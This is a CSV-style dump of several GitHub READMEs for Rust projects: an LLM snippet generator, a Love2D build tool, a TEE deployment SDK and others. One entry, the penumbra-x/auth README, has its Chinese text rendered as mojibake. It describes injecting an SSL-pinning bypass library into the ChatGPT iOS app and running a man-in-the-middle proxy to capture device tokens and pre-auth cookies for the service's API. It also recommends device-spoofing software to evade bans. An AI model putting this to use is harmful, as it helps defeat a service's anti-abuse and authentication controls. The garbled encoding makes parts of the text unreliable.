",6,0,3,NOASSERTION,"build-cross-compile.yml,build-linux.yml,build-macos.yml,build-windows.yml,main.yml,test.yml",1.0
alekseysidorov/tower-http-client,main,tower-http-client/README.md,1,0,2,MIT,ci.yml,1.0
evgenyigumnov/rustsn,main,"# rustsn - This Rust-based tool generates, compiles, and tests code using LLMs, resolves dependencies, and provides explanations of existing code through embeddings.

![rustsn](https://github.com/evgenyigumnov/rustsn/raw/HEAD/logo.png)

## Features

1. **generate function** command is used to generate code snippets based on user-provided explanations.
2. TODO: **generate application** command is used to generate seed project code based on user-provided explanations.
3. **ask** command is used to get explanation by existing codes of your project based on user-provided question.

## Supported languages by feature
| language   | generate function | generate application | ask |
|------------|-------------------|----------------------|-----|
| Rust       | +                 | -                    | +   |
| JavaScript | +                 | -                    | +   |
| C#         | -                 | -                    | +   |
| Python     | +                 | -                    | -   |
| TypeScript | +                 | -                    | -   |
| Java       | +                 | -                    | -   |
| Kotlin     | +                 | -                    | -   |
| Swift      | +                 | -                    | -   |
| PHP        | +                 | -                    | -   |
| Scala      | +                 | -                    | -   |


## Project name explanation

Project name ""rustsn"" is a combination of ""Rust"" and ""Snippet"" words. Code snippets are generated by the tool written in Rust language.


## Installation

### Prerequisites

- **Rust**: Ensure you have Rust installed. You can install it from [here](https://www.rust-lang.org/tools/install).
- **Make a decision**: Use Ollama (free and launched on your machine) or the OpenAI API (paid and launched on OpenAI servers).
- **If you choose Ollama**: Required for LLM interactions. Install from [Ollama's official site](https://ollama.ai/).
  - Download Ollam models  
   ```bash
   ollama pull qwen2.5-coder:7b  
   ollama pull bge-large  # if your need ""ask"" command functionality for existed project code
   ```
  - Set environment variable OLLAMA_NUM_PARALLEL_REQUESTS=2 if you plan launch gemma2:9b and bge-large models in parallel for ""ask"" command (do not forger to restart your PC)
- **If you choose OpenAI API**: Create file ""token.txt"" in the root folder and put your OpenAI API key there.

### Install CLI Tool via Cargo

```bash
cargo install rustsn
```
This command will download the package source from crates.io, build it, and install the binary into the standard Cargo binaries directory ($HOME/.cargo/bin on Unix-like systems, or %USERPROFILE%\.cargo\bin on Windows).
If PATH variable is correctly configured, you can run the tool from any directory.
## Usage - Generate Function

1. **Start the Program**

   ```bash
   rustsn generate function --lang=rust 
   ```

2. **Provide an Explanation**

   The program will prompt:

   ```
   Explain what the function should do:
   ```

   Enter a detailed explanation of the function you want to generate.
   ```
   parse json string and return struct User (age, name)
   ```
3. **Completion**

   Once the code compiles and all tests pass, the final code and tests will be displayed and result of work will be saved in `sandbox` folder.

For example:

```
[dependencies]
serde = { version = ""1.0"", features = [""derive""] }
serde_json = ""1.0""

use serde::{Deserialize, Serialize};

#[derive(Deserialize, Serialize, Debug)]
struct User {
    name: String,
    age: u32,
}

fn solution(json_string: &str) -> Result<User, serde_json::Error> {
    let user: User = serde_json::from_str(json_string)?;
    Ok(user)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_solution() {
        let json_string = r#""{""name"": ""John Doe"", ""age"": 30}""#;
        let user = solution(json_string).unwrap();
        assert_eq!(user.name, ""John Doe"");
        assert_eq!(user.age, 30);
    }

    #[test]
    fn test_solution_invalid_json() {
        let json_string = r#""{""name"": ""John Doe"", ""age"": }""#;
        assert!(solution(json_string).is_err());
    }
}

Finished
```

## Usage - Ask

1. **Start the Program**

   ```bash
   rustsn ask /path/to/your/project --lang=rust
   ```

2. **Provide an Explanation**

   The program will prompt:

   ```
   Enter the question about your project sources:
   ```
   
   Enter a question about your project sources.
   ```
   How work parse function for PDF files?
   ```
3. **Completion**

   The program will return the explanation based on the existing code of your project.
```
Find closest files:
File: ../shiva/lib\src\pdf.rs
...

Answer: The `parse` function for PDF files in the provided Rust code is implemented as part of the `Transformer` struct in the `pdf.rs` file. This function is responsible for converting a PDF document into a `Document` object composed of various `Element` types. Here's a detailed breakdown of how it works:

1. **Load the PDF Document**:
   - The function takes a reference to a `Bytes` object, which contains the PDF data.
   - It uses the `lopdf` library to load the PDF document from memory using `PdfDocument::load_mem`.

2. **Iterate Through Pages**:
   - The function retrieves the pages of the PDF using `pdf_document.get_pages()`.
   - It iterates over each page to process its contents.

3. **Process Page Contents**:
   - For each page, it retrieves the contents using `pdf_document.get_page_contents(page_id)`.
   - It iterates over each content object in the page and calls the `parse_object` function to process it.

4. **Parse Individual Objects**:
   - The `parse_object` function is responsible for interpreting the contents of each object in the PDF.
   - It decodes text using the `PdfDocument::decode_text` method, manages element types like `List`, `Paragraph`, and `Text`, and handles operations associated with text positioning and font changes (e.g., ""Tm"", ""Tf"", ""Tj"", ""TJ"", ""ET"").

5. **Text Collection**:
   - The function `collect_text` is used to gather and decode text from PDF objects, considering encoding and operand types.
   - It adds decoded text to a string and determines when new elements like lists or paragraphs should be started based on the content.

6. **Construct Document Elements**:
   - The function constructs `Element` types such as `Text`, `Paragraph`, and `List`, and adds them to a vector of elements.
   - These elements are used to build the final `Document` object, representing the structure and content of the PDF.

7. **Return the Document**:
   - After processing all pages and objects, the function returns a `Document` instance containing all the parsed elements.

In summary, the `parse` function for PDF files reads the PDF data, iterates through its pages and content objects, decodes text, and constructs a structured `Document` composed of various elements, which can then be used for further processing or transformation.
```


## Contributing

I would love to see contributions from the community. If you experience bugs, feel free to open an issue. If you would like to implement a new feature or bug fix, please follow the steps:
1. Do fork 
2. Add comment to the [issue](https://github.com/evgenyigumnov/rustsn/issues) that you are going to work on it
3. Create pull request

#### License

<sup>
Licensed under either of <a href=""LICENSE-APACHE"">Apache License, Version
2.0</a> or <a href=""LICENSE-MIT"">MIT license</a> at your option.
</sup>

<br>

<sub>
Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in Rustsn by you, as defined in the Apache-2.0 license, shall be
dual licensed as above, without any additional terms or conditions.
</sub>


## Versions
### 0.22.0 - ""Ask"" command for C# and JavaScript 11 October 2024
- Add ""ask"" command for C# and JavaScript languages

### 0.17.0 - ""Ask"" command 11 October 2024
- Add ""ask"" command to get explanation by existing codes of your project based on user-provided question

### 0.16.0 - MIT or Apache-2.0 26 September 2024
- Add MIT or Apache-2.0 license

### 0.15.0 - TypeScript 24 September 2024
- Add TypeScript language support

### 0.14.0 - Swift 23 September 2024
- Add Swift language support

### 0.13.0 - Kotlin 23 September 2024
- Add Kotlin language support

### 0.12.0 - Python 22 September 2024
- Add Python language support

### 0.11.0 - PHP 22 September 2024
- Add PHP language support
 
### 0.10.0 - JavaScript 22 September 2024
- Add JavaScript language support

### 0.9.0 - Scala 22 September 2024
- Add Scala language support

### 0.8.0 - Java 22 September 2024
- Add Java language support

### 0.7.0 - Simplification 22 September 2024
- Simplify state machine logic and remove logic.md file
- Simplify prompt.txt file

### 0.6.0 - Add ""clap"" crate 21 September 2024
- Add --lang parameter to specify the language of the generated code (Rust, Python, C, JavaScript, Java, TypeScript, CPP, Scala, Kotlin, Swift)

### 0.5.0 - Support multi-language code generation 21 September 2024
- Make decision to support multi-language code generation: Python, C, JavaScript, Java, TypeScript, CPP, Scala, Kotlin, Swift

### 0.4.0 - LLM Generate Result Extraction - 20 September 2024
- Extract_code function replaced by extract_code, extract_dep, extract_test functions

### 0.3.0 - State Machine - 20 September 2024
- Support OpenAI API

### 0.2.0 - State Machine - 19 September 2024
- Moved prompts from code to ""rust.prompt"" file
- Moved logic from code to ""logic.md"" file

### 0.1.0 - Prototype - 17 September 2024
- Code Generation
- Automated Compilation
- Dependency Resolution
- Test Generation
- Error Correction
- Caching Mechanism 

",0,19,2,Apache-2.0,,18.0
penumbra-x/auth,main,"# auth

ËøôÊòØ‰∏Ä‰∏™ÈÄÇÁî®‰∫é`iOS`/`iPad`ËÆæÂ§áÁöÑ`HTTP`‰∏≠Èó¥‰∫∫‰ª£ÁêÜÔºåÁî®‰∫éÊäìÂèñ`device_token`

### ÂâçË®Ä

ÊúÄÊñ∞ÁâàÁöÑ`ChatGPT` APPÂ∑≤‰∏ä[`SSL pinning`](https://medium.com/trendyol-tech/securing-ios-applications-with-ssl-pinning-38d551945306)È™åËØÅÔºå‰ΩøÁî®ÂâçÊèê:

- `iOS`/`iPad`ËÆæÂ§áÈúÄË¶ÅË∂äÁã±ÊàñËÄÖÂ∑≤ÁªèÂÆâË£Ö[`Â∑®È≠î`](https://github.com/opa334/TrollStore)Ôºà**Ë∂äÁã±Âêé‰πüÂèØ‰ª•ÂÆâË£Ö**Ôºâ
- Âú®[`Â∑®È≠î`](https://github.com/opa334/TrollStore)ÂïÜÂ∫óÂÆâË£Ö[`TrollFools`](https://github.com/Lessica/TrollFools)Ôºå‰∏ãËΩΩ[`üëâ Âä®ÊÄÅÂ∫ì`](https://github.com/penumbra-x/auth/releases/download/lib/SSLKillSwitch2.dylib)Ê≥®ÂÖ•Âà∞`ChatGPT`

‰ª•‰∏äÂè™ÊòØÊé®ËçêÁöÑÊñπÊ≥ïÔºåÂΩìÁÑ∂‰πüÊúâÂÖ∂ÂÆÉÊñπÊ≥ïÔºåÁõÆÁöÑÊòØÁªïËøá[`SSL pinning`](https://medium.com/trendyol-tech/securing-ios-applications-with-ssl-pinning-38d551945306)

### ÂëΩ‰ª§

```bash
$ auth -h
chatgpt preauth devicecheck server

Usage: auth
       auth <COMMAND>

Commands:
  run      Run server
  start    Start server daemon
  restart  Restart server daemon
  stop     Stop server daemon
  log      Show the server daemon log
  ps       Show the server daemon process
  help     Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version

$ auth run -h
Run server

Usage: auth run [OPTIONS]

Options:
  -d, --debug          Debug mode
  -b, --bind <BIND>    Bind address [default: 0.0.0.0:1080]
  -p, --proxy <PROXY>  Upstream proxy
      --cert <CERT>    MITM server CA certificate file path [default: ca/cert.crt]
      --key <KEY>      MITM server CA private key file path [default: ca/key.pem]
  -h, --help           Print help
```

### ÂÆâË£Ö

- ÁºñËØëÂÆâË£Ö

```bash
# ÈúÄË¶ÅÂÖàÂÆâË£Örust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

cargo install --git https://github.com/penumbra-x/auth
```

- Docker

```bash
docker run --rm -it -p 1080:1080 ghcr.io/penumbra-x/auth:latest run
```

### ‰ΩøÁî®

ËØ•‰ª£ÁêÜ‰∏ç‰ºöÂÉèÊ≠£Â∏∏‰ª£ÁêÜ‰∏ÄÊ†∑Êèê‰æõÊ≠£Â∏∏ÁöÑÁΩëÁªú‰ª£ÁêÜÔºåÁõÆÁöÑÊòØÊäìÂåÖ`device_token`„ÄÇÂ¶ÇÊûúÂÆ≥ÊÄï‰ΩøÁî®Â§ö‰∫Ü‰ºöË¢´Â∞ÅËÆæÂ§áÔºåÊàëÂª∫ËÆÆÊòØ‰ΩøÁî®‰∏Ä‰∫õ‰∏ÄÈîÆÊç¢Êú∫‰πãÁ±ªÁöÑ‰ªøÂÜíËÆæÂ§áÁöÑËΩØ‰ª∂„ÄÇ

1. ÂêØÂä®ÊúçÂä°

- ËøêË°åÊúçÂä°

```bash
auth run
# Â∏¶‰ª£ÁêÜ
auth run --proxy http://192.168.1.1:1080
```

- ÂÆàÊä§ËøõÁ®ã

```bash
auth start
# Â∏¶‰ª£ÁêÜ
auth start --proxy http://192.168.1.1:1080
```

2. ËÆæÁΩÆ‰ª£ÁêÜ

`Wi-Fi`/`Shadowrocket`ËÆæÁΩÆ`HTTP`‰ª£ÁêÜ

3. ‰ø°‰ªªËØÅ‰π¶

ÊµèËßàÂô®ÊâìÂºÄ`http://192.168.1.100:1080/mitm/cert`ÔºåÊõøÊç¢‰Ω†ÁöÑ‰ª£ÁêÜ`IP`‰ª•Âèä`Á´ØÂè£`ÔºåÊâìÂºÄ‰∏ãËΩΩÂÆâË£Ö‰ª•Âèä‰ø°‰ªªËØÅ‰π¶„ÄÇÂà∞ËøôÈáåÂ∞±ÂΩªÂ∫ïÂÆåÊàê‰∫ÜÔºåÁî±‰∫é`Hook`‰∫Ü`ChatGPT`ÁöÑÁΩëÁªúËØ∑Ê±ÇÔºåÊúâ‰ª•‰∏ã‰∏§ÁßçÊäìÂèñÊõ¥Êñ∞`device_token`ÁöÑÂä®‰Ωú:

- ÊØèÊ¨°ÊâìÂºÄÂíåÂÖ≥Èó≠`APP`ÈÉΩ‰ºöÊäìÂèñ‰∏ÄÊ¨°Ôºå
- ÊâìÂºÄ`APP`‰ªªÊÑèÁÇπÂáªÁôªÂΩï‰ºöÊäìÂèñ‰∏ÄÊ¨°ÔºåÂêåÁêÜÁÇπÂáªÂèñÊ∂àÂæÄÂ§çÊìç‰Ωú‰πüÁîüÊïà„ÄÇ

4. Ëé∑Âèñ`preauth_cookie`

ËØ∑Ê±ÇÊé•Âè£`http://192.168.1.100:1080/auth/preauth`ÔºåÊõøÊç¢‰Ω†ÁöÑ‰ª£ÁêÜ`IP`‰ª•Âèä`Á´ØÂè£`ÔºåÁ§∫‰æã:

- Request

```bash
curl http://127.0.0.1:1080/auth/preauth
```

- Response
  
```json
{
  ""preauth_cookie"": ""900175BB-61C4-4AA2-B400-4DE3B2E1FD7E:1726892032-9nYJ1mU4JSUAEyhACbVOxYoCATD4uXX8H1HZRJzYQ4E%3D""
}
```

Âà∞ËøôÈáåÈ°πÁõÆÁöÑ‰ΩøÂëΩÂ∑≤ÁªèÂÆåÊàêÔºå‰Ω†ÂèØ‰ª•Â∞Ü`preauth_cookie`Áî®Âú®`ios.chat.openai.com`ÁöÑÊé•Âè£ÊàñËÄÖÁôªÂΩï„ÄÇ

### Ê≥®ÊÑè

- Ëá™Âä®ÂåñÊìç‰ΩúAPP‰ΩøÁî®‰∏çÈúÄË¶ÅÂ§™È¢ëÁπÅÔºå`cookie`Â§ßÊ¶Ç‰ºöÂú®‰∏ÄÊÆµÊó∂Èó¥ÂÜÖËøáÊúüÔºàÂÖ∑‰Ωì‰∏çËÆ∞Âæó‰ªÄ‰πàÊó∂Èó¥‰∫ÜÔºå24Â∞èÊó∂ÔºüÔºâ
- Âª∫ËÆÆ‰∏çË¶ÅÊääÊúçÂä°ÊîæÂà∞ÂÖ¨ÁΩëÔºåÂÜÖÁΩë‰ΩøÁî®Cloudflare [Tunnel](https://www.cloudflare.com/zh-cn/products/tunnel/)ÂºÄÊîæ`/auth/preauth`Êé•Âè£
",0,0,1,MIT,rust.yml,0.0
Wolfyxon/lover,main,"# Lover
Lover is a open source command line build system and runner for [Love2D](https://love2d.org) projects inspired by Cargo.

[Wiki](https://github.com/Wolfyxon/lover/wiki) | [CLI usage](https://github.com/Wolfyxon/lover/wiki/Using-Lover) | [Constants](https://github.com/Wolfyxon/lover/wiki/Constants)

## Features
### Easy cross-platform building
You can easily build your game for all supported platforms with a single command.

### Automatic dependency management
Love binaries required for building are downloaded automatically and can easily be managed by using Lover commands.

### Finally a good `run` command
When using `lover run` you can pass arguments to your game and even --flags.

Most tools like **Makefile** and **Cargo** will treat all flags as their own and not allow such things.

```
lover run someArgument --someFlag --gameMode=survival
```

### Default environment variables
You can access certain constants like the game's version by the use of `os.getenv()`.
```lua
local version = os.getenv(""LOVER_VERSION"")
```
[learn more](https://github.com/Wolfyxon/lover/wiki/Constants)

### Simple command line interface
Lover has a simple and easy to use command syntax (at least I hope).

## Supported platforms
- ‚úÖ **Full support**: The platform is fully supported and should work
- üü° **Partial support**: The platform mostly works but you may encounter issues
- üìÅ **Planned**: Support will be implemented in future
- ‚≠ï **Not yet needed**: The platform is not widely used. If you want support for it [you can open an issue](https://github.com/Wolfyxon/lover/issues/new) and it will be implemented.
- ‚ùó **Testers/maintainers needed**: someone is needed to test and/or maintain the platform
- ‚ùå **Impossible**: The platform is currently impossible to implement

### Build targets
| Name                | Arch   | Alias   | Status |
|---------------------|--------|---------|--------|
| Universal LOVE file |        | `love`  | ‚úÖ     |
| Linux AppImage      | x86_64 | `linux` | ‚úÖ     |
| Linux AppImage      | x86_32 |         | ‚ùå     |
| Windows             | x86_64 | `win64` | ‚úÖ     |
| Windows             | x86_32 | `win32` | ‚úÖ     |
| MacOS               |        |         | ‚ùó     |
| Web                 |        |         | üìÅ     |
| Android             |        |         | üìÅ     |
| Nintendo 3DS `3DSX` |        |         | üìÅ     |
| Nintendo 3DS `CIA`  |        |         | üìÅ     |
| Nintendo Wii U      |        |         | ‚ùó     |
| Nintendo Switch     |        |         | ‚ùó     |

Please also see [the compatibility matrix](https://github.com/Wolfyxon/lover/wiki/Building#support).

The `love` target is runnable on all platforms, but require [L√ñVE](https://love2d.org/) to be installed.

### Lover tool
| Platform | Arch   | Status |
|----------|--------|--------|
| Linux    | x86_64 | ‚úÖ     |
| Linux    | x86_32 | ‚≠ï     |
| Windows  | x86_64 | ‚úÖ     |
| Windows  | x86_32 | ‚≠ï     |
| MacOS    |        | ‚ùó     |

## Compiling
Lover is written in **Rust** and managed by **Cargo**. 

Install Cargo on your system then open the terminal in the Lover's source directory and run:
```
cargo build
```
or
```
cargo run
```
to just run it.

Read [the documentation](https://doc.rust-lang.org/cargo/) for more info.

## Why?
I wanted to create a simple expandable and universal system for building, running and managing Love2D projects.

This is a replacement for my previous project [Love2D Universal](https://github.com/Wolfyxon/love2d-universal) which utilized a single Makefile, however a global system-wide tool is a way better approach.
A single script setup for a large project is not a good idea, as organization is not great for such big scripts and implementing a lot of advanced features is not easy. 
Also this tool does not require installing as much software as Love2D Universal and has a nice error handling and warnings.

This tool is also very similar to [Cargo](https://github.com/rust-lang/cargo/) which manages Rust projects.

## Used crates
- `reqwest`: Sending HTTP requests and downloading files
- `serde`: Serializing structs
- `serde_json`: JSON parsing and serde support
- `toml`: TOML parsing and serde support
- `zip`: Managing ZIP archives
- `image`: Handling image files
- `dirs`: Finding system directories on various platforms
- `regex`: Using regular expressions on strings
- `ansi_term`: Styling terminal output
- `backhand`: Modifying, creating and parsing SquashFS
",4,2,1,LGPL-2.1,rust.yml,0.0
0xPARC/parcnet,main,"# The PARCNET
## Crates
- [`parcnet-pod`](https://crates.io/crates/parcnet-pod): a minimal [POD](https://pod.org) implementation
- [`parcnet`](https://crates.io/crates/parcnet): squatting the name
- [`chat`](https://crates.io/crates/parcnet): hackable chat app; use `cargo dev` to run on dev mode
",7,0,20,,"release.yml,test.yml",26.0
Dstack-TEE/dstack,master,"# Dstack

Dstack is an highly experimental and evolving-fast SDK to deploy Docker-based TEE applications.

It was inspired by [Andrew's](https://github.com/amiller) (Flashbots team) design of [Dstack](https://collective.flashbots.net/t/dstack-speedrunning-a-p2p-confidential-vm). It was originally built as Phala's opinionated implementation. We aim to merge it into a production ready project eventually.

# Overview

Components in Dstack:

- `teepod`: A service running in bare TDX host to manage CVMs
- `tproxy`: A reverse proxy to forward TLS connections to CVMs
- `kms`: A KMS server to generate keys for CVMs
- `tappd`: A service running in CVM to serve containers' key derivation and attestation requests
- `meta-dstack`: A Yocto meta layer to build CVM guest images

The overall architecture is shown below:
![arch](./docs/assets/arch.png)

# Directory structure

```text
dstack/
    kms/                         A prototype KMS server
    tappd/                       A service running in CVM to serve containers' key derivation and attestation requests.
    tdxctl/                      A CLI tool getting TDX quote, extending RTMR, generating cert for RA-TLS, etc.
    teepod/                      A service running in bare TDX host to manage CVMs
    tproxy/                      A reverse proxy to forward TLS connections to CVMs
    certbot/                     A tool to automatically obtain and renew TLS certificates for tproxy
    ra-rpc/                      RA-TLS support for pRPC
    ra-tls/                      RA-TLS support library
    tdx-attest/                  Guest library for getting TDX quote and extending RTMR
```

# Build and play locally

## Prerequisites

- A TDX host machine setup following [canonical/tdx](https://github.com/canonical/tdx)
- Public IPv4 address assigned to the machine
- A domain name you can modify DNS records

## Install dependencies

```bash
# for Ubuntu 24.04
sudo apt install -y build-essential chrpath diffstat lz4 wireguard-tools
# install rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

## Build and run

```bash
git clone https://github.com/Dstack-TEE/meta-dstack.git --recursive
cd meta-dstack/
source dev-setup

mkdir build
cd build
../build.sh
# This outputs the following message:
# Config file ../build-config.sh created, please edit it to configure the build

vim ../build-config.sh
```

Now edit the config file. The following configurations values must be changed properly according to your environment:

```bash
# The internal port for teepod to listen to requests from you
TEEPOD_RPC_LISTEN_PORT=9080
# The start CID for teepod to allocate to CVMs
TEEPOD_CID_POOL_START=20000

# The internal port for kms to listen to requests from CVMs
KMS_RPC_LISTEN_PORT=9043
# The internal port for tproxy to listen to requests from CVMs
TPROXY_RPC_LISTEN_PORT=9070

# WireGuard interface name for tproxy
TPROXY_WG_INTERFACE=tproxy-kvin
# WireGuard listening port for tproxy
TPROXY_WG_LISTEN_PORT=9182
# WireGuard server IP for tproxy
TPROXY_WG_IP=10.0.3.1
# WireGuard client IP range
TPROXY_WG_CLIENT_IP_RANGE=10.0.3.0/24
# The public port for tproxy to listen to requests that would be forwarded to app in CVMs
TPROXY_SERVE_PORT=9443

# The public domain name for tproxy. Please set a wildacard DNS record (e.g. *.app.kvin.wang in this example)
# for this domain that points the IP address of your TDX host.
TPROXY_PUBLIC_DOMAIN=app.kvin.wang
# The path to the TLS certificate for tproxy's public endpoint
TPROXY_CERT=/etc/rproxy/certs/cert.pem
# The path to the TLS key for tproxy's public endpoint
TPROXY_KEY=/etc/rproxy/certs/key.pem
```

Run build.sh again to build the artifacts.

```bash
../build.sh

# If everything is okay, you should see the built artifacts in the `build` directory.
$ ls
certs  images  kms  kms.toml  run  teepod  teepod.toml  tproxy  tproxy.toml

# The wireguard interface should be set up:
$ ifconfig tproxy-kvin
tproxy-kvin: flags=209<UP,POINTOPOINT,RUNNING,NOARP>  mtu 1420
        inet 10.0.3.1  netmask 255.255.255.0  destination 10.0.3.1
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 4839  bytes 839320 (839.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3836  bytes 507540 (507.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Now you can open 3 terminals to start the components:

1. Run `./kms`
2. Run `sudo ./tproxy`
3. Run `./teepod`

## Deploy an App
Open the teepod webpage [http://localhost:9080](http://localhost:9080)(change the port according to your configuration) on your local machine to deploy a `docker-compose.yaml` file:

![teepod](./docs/assets/teepod.png)

After the container deployed, it should need some time to start the CVM and the containers. Time would be vary depending on your workload.

- Click the [Logs] button to see the logs of the CVM, you can see if the container is finished starting there.

- Once the container is running, you can click the [Dashboard] button to see some information of the container. And the logs of the containers can be seen in the [Dashboard] page.

    ![tappd](./docs/assets/tappd.png)

- You can open tproxy's dashboard at [https://localhost:9070](https://localhost:9070) to see the CVM's wireguard ip address, as shown below:

![tproxy](./docs/assets/tproxy.png)

## Pass Secrets to Apps
When deploying a new App, you can pass private data via Encrypted Environment Variables. These variables can be referenced in the docker-compose.yaml file as shown below:

![secret](./docs/assets/secret.png)

The environment variables will be encrypted in the client-side and decrypted in the CVM before being passed to the containers.

## Access the App

Once the app is deployed and listening on an HTTP port, you can access the HTTP service via tproxy's public domain. The ingress mapping rules are:

- `<id>[s].<base_domain>` maps to port `80` or `443` if with `s` in the CVM.
- `<id>-<port>[s].<base_domain>` maps to port `<port>` in the CVM.

For example, `3327603e03f5bd1f830812ca4a789277fc31f577-8080.app.kvin.wang` maps to port `8080` in the CVM.

Where the `<id>` can be either the app id or the instance id. If the app id is used, one of the instances will be selected by the load balancer.
If the `id-port` part ends with `s`, it means the TLS connection will be passthrough to the app rather than terminating at tproxy.

You can also ssh into the CVM to inspect more information, if your deployment uses the image `dstack-x.x.x-dev`:

```bash
# The IP address of the CVM can be found in the tproxy dashboard.
ssh root@10.0.3.2
```

## Getting TDX quote in docker container

To get a TDX quote within app containers:

1. Mount `/var/run/tappd.sock` to the target container in `docker-compose.yaml`

    ```yaml
    version: '3'
    services:
    nginx:
        image: nginx:latest
        volumes:
        - /var/run/tappd.sock:/var/run/tappd.sock
        ports:
        - ""8080:80""
        restart: always
    ```

2. Execute the quote request command in the container.

    ```bash
    # The argument report_data accepts binary data encoding in hex string.
    # The actual report_data passing the to the underlying TDX driver is sha2_256(report_data).
    curl -X POST --unix-socket /var/run/tappd.sock -d '{""report_data"": ""0x1234deadbeef""}' http://localhost/prpc/Tappd.TdxQuote?json | jq .  
    ```

## Container logs

Container logs can be obtained from the CVM's `dashboard` page or by curl:

```bash
curl 'http://<appid>.app.kvin.wang:9090/logs/<container name>?since=0&until=0&follow=true&text=true&timestamps=true&bare=true'
```

Replace `<appid>` and `<container name>` with actual values. Available parameters:

- since=0: Starting Unix timestamp for log retrieval
- until=0: Ending Unix timestamp for log retrieval
- follow: Enables continuous log streaming
- text: Returns human-readable text instead of base64 encoding
- timestamps: Adds timestamps to each log line
- bare: Returns the raw log lines without json format

The response of the RPC looks like:
```
$ curl 'http://0.0.0.0:9190/logs/zk-provider-server?text&timestamps'
{""channel"":""stdout"",""message"":""2024-09-29T03:05:45.209507046Z Initializing Rust backend...\n""}
{""channel"":""stdout"",""message"":""2024-09-29T03:05:45.209543047Z Calling Rust function: init\n""}
{""channel"":""stdout"",""message"":""2024-09-29T03:05:45.209544957Z [2024-09-29T03:05:44Z INFO  rust_prover] Initializing...\n""}
{""channel"":""stdout"",""message"":""2024-09-29T03:05:45.209546381Z [2024-09-29T03:05:44Z INFO  rust_prover::groth16] Starting setup process\n""}
```

## Reverse proxy: TLS Passthrough

The build configuration for TLS Passthrough is:

```bash
TPROXY_LISTEN_PORT_PASSTHROUGH=9008
```

With this configuration, tproxy listens port `9008` for incoming TLS connections and forwards them to the appropriate Tapp based on `SNI`, where SNI represents your custom domain and the forwarding destination is determined by your DNS records.

For example, assuming I've deployed an app at `3327603e03f5bd1f830812ca4a789277fc31f577`, as shown below:

![appid](./docs/assets/appid.png)

Now, I want to use my custom domain `tapp-nginx.kvin.wang` to access the Tapp. I need to set up two DNS records with my DNS provider (Cloudflare in my case):

1. `A` or `CNAME` record to point the domain to the tdx machine:

    ![tapp-dns-a](./docs/assets/tapp-dns-a.png)

2. `TXT` record to instruct the Tproxy to direct the request to the specified Tapp:

    ![tapp-dns-txt](./docs/assets/tapp-dns-txt.png)

Where

`_tapp-address.tapp-nginx.kvin.wang` means configuring the tapp destination address of domain `tapp-nginx.kvin.wang`.

The TXT record value `3327603e03f5bd1f830812ca4a789277fc31f577:8043` means that requests sent to `tapp-nginx.kvin.wang` will be processed by Tapp `3327603e03f5bd1f830812ca4a789277fc31f577` on port `8043`

Given the config `TPROXY_LISTEN_PORT_PASSTHROUGH=9008`, now we can go to [`https://tapp-nginx.kvin.wang:9008`](https://tapp-nginx.kvin.wang:9008) and the request will be handled by the service listening on `8043` in Tapp `3327603e03f5bd1f830812ca4a789277fc31f577`.

## Upgrade an App

Got to the teepod webpage, click the [Upgrade] button, select or paste the compose file you want to upgrade to, and click the [Upgrade] button again.
Upon successful initiation of the upgrade, you'll see a message prompting you to run the following command in your terminal to authorize the upgrade through KMS:

```shell
./kms-allow-upgrade.sh <app_id> <upgraded_app_id>
```

The app id does not change after the upgrade. Stop and start the app to apply the upgrade.

## HTTPS Certificate Transparency

In the tutorial above, we used a TLS certificate with a private key external to the TEE (Tproxy-CVM here). To establish trust, we need to generate and maintain the certificate's private key within the TEE and provide evidence that all TLS certificates for the domain were originate solely from Tproxy-CVM.

By combining Certificate Transparency Logs and CAA DNS records, we can make best effort to minimize security risks. Here's our approach:

- Set CAA records to allow only the account created in Tproxy-CVM to request Certificates.
- Launch a program to monitor Certificate Transparency Log and give alarm once any certificate issued to a pubkey that isn‚Äôt generated by Tproxy.

### Configurations

To launch Certbot, you need to own a domain hosted on Cloudflare. Obtain an API token with DNS operation permissions from the Cloudflare dashboard. Configure it in the `build-config.sh`:

```bash
# The directory to store the auto obtained TLS certificate and key
TPROXY_CERT=${CERBOT_WORKDIR}/live/cert.pem
TPROXY_KEY=${CERBOT_WORKDIR}/live/key.pem

# for certbot
CF_ZONE_ID=cc0a40...
CF_API_TOKEN=g-DwMH...
# ACME_URL=https://acme-v02.api.letsencrypt.org/directory
ACME_URL=https://acme-staging-v02.api.letsencrypt.org/directory
```

Then re-run the ../build.sh:

```bash
../build.sh
```

### Launch certbot

Then run the certbot in the `build/` and you will see the following log:
```text
$ RUST_LOG=info,certbot=debug ./certbot renew -c certbot.toml
2024-10-25T07:41:00.682990Z  INFO certbot::bot: creating new ACME account
2024-10-25T07:41:00.869246Z  INFO certbot::bot: created new ACME account: https://acme-staging-v02.api.letsencrypt.org/acme/acct/168601853
2024-10-25T07:41:00.869270Z  INFO certbot::bot: setting CAA records
2024-10-25T07:41:00.869276Z DEBUG certbot::acme_client: setting guard CAA records for app.kvin.wang
2024-10-25T07:41:01.740767Z DEBUG certbot::acme_client: removing existing CAA record app.kvin.wang 0 issuewild ""letsencrypt.org;validationmethods=dns-01;accounturi=https://acme-staging-v02.api.letsencrypt.org/acme/acct/168578683""
2024-10-25T07:41:01.991298Z DEBUG certbot::acme_client: removing existing CAA record app.kvin.wang 0 issue ""letsencrypt.org;validationmethods=dns-01;accounturi=https://acme-staging-v02.api.letsencrypt.org/acme/acct/168578683""
2024-10-25T07:41:02.216751Z DEBUG certbot::acme_client: setting CAA records for app.kvin.wang, 0 issue ""letsencrypt.org;validationmethods=dns-01;accounturi=https://acme-staging-v02.api.letsencrypt.org/acme/acct/168601853""
2024-10-25T07:41:02.424217Z DEBUG certbot::acme_client: setting CAA records for app.kvin.wang, 0 issuewild ""letsencrypt.org;validationmethods=dns-01;accounturi=https://acme-staging-v02.api.letsencrypt.org/acme/acct/168601853""
2024-10-25T07:41:02.663824Z DEBUG certbot::acme_client: removing guard CAA records for app.kvin.wang
2024-10-25T07:41:03.095564Z DEBUG certbot::acme_client: generating new cert key pair
2024-10-25T07:41:03.095678Z DEBUG certbot::acme_client: requesting new certificates for *.app.kvin.wang
